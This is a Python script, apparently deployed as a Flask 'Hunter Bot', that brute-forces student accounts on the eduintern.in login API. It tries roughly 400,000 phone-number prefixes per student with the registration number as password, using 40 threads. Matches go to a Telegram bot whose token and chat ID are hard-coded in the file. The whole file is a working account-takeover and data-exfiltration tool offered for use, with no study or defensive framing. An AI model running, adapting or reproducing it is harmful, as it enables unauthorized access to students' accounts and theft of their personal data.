import requests
import time
import os
import threading
import traceback
from concurrent.futures import ThreadPoolExecutor
from flask import Flask

app = Flask(__name__)

# ==========================================
# YAHAN APNI TELEGRAM DETAILS DAALO
# ==========================================
BOT_TOKEN = "8845557626:AAHyHv_BNpKS8OG-YVphwMSthEorIncWtmM"
CHAT_ID = "1634075045"
# ==========================================

API_URL = "https://www.eduintern.in/api/auth/login"
FILE_NAME = "students.txt" 
THREADS = 40 

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "https://www.eduintern.in",
    "Referer": "https://www.eduintern.in/login",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0"
}

def send_telegram_msg(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text}
    try:
        res = requests.post(url, json=payload)
        if res.status_code != 200:
            print(f"Telegram Error: {res.text}")
    except Exception as e:
        print("Telegram Exception:", e)

def check_number(reg_no, last4, prefix6):
    phone = prefix6 + last4
    payload = {
        "phone": phone,
        "password": reg_no
    }
    
    try:
        r = requests.post(API_URL, json=payload, headers=HEADERS, timeout=10)
        if r.status_code == 200:
            return phone
        elif r.status_code == 401:
            return False
        elif r.status_code == 429:
            time.sleep(2)
            return False
    except Exception:
        pass
    return False

def process_student(index, reg_no, last4):
    print(f"\n[{index}] Searching number ending with {last4} for Reg: {reg_no}...", flush=True)
    
    valid_first_digits = ['6', '7', '8', '9']
    prefixes = [f"{first_digit}{i:05d}" for first_digit in valid_first_digits for i in range(100000)]
    
    found_phone = None
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for prefix in prefixes:
            future = executor.submit(check_number, reg_no, last4, prefix)
            result = future.result()
            if result:
                found_phone = result
                break
    
    if found_phone:
        msg = f"[{index}] {reg_no}    {found_phone}  sus"
        print(msg, flush=True)
        send_telegram_msg(msg)
    else:
        msg = f"[{index}] {reg_no}    no match number found"
        print(msg, flush=True)
        send_telegram_msg(msg)
            
    send_telegram_msg("--------------------------------\nNext target scan ho raha hai...")

def run_hunter():
    time.sleep(5)
    try:
        # Render me path dhundhne ke liye check
        print(f"Looking for file at: {os.path.abspath(FILE_NAME)}", flush=True)
        
        with open(FILE_NAME, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
            
        print(f"Total {len(lines)} lines mili. Kaam shuru...", flush=True)
        send_telegram_msg(f"🚀 Script start ho gayi! Total {len(lines)} students process honge.")
        
        for i, line in enumerate(lines, start=1):
            parts = line.split()
            if len(parts) >= 2:
                reg_no = parts[0]
                last4 = parts[1]
                process_student(i, reg_no, last4)
                
        send_telegram_msg("✅ Saare students process ho gaye! File check kar le.")
                
    except Exception as e:
        print("Error in run_hunter:", e, flush=True)
        traceback.print_exc()
        send_telegram_msg(f"❌ Error aaya: {str(e)}")

@app.route('/')
def home():
    return "Hunter Bot is running 24x7..."

if __name__ == "__main__":
    threading.Thread(target=run_hunter, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
